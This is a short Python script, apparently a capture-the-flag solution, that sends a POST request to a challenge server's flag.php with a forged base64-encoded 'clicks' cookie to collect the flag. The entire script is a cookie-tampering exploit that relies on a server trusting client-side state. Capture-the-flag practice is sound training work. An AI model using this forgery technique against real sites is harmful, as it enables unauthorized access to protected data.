#!/usr/bin/env python3
import requests
import base64

url = 'http://challs.crate.nu:50012/flag.php'

cookie_value = base64.b64encode(b'1000000000').decode()

cookies = {"clicks": cookie_value}

r = requests.post(url, cookies=cookies)

print(r.text)
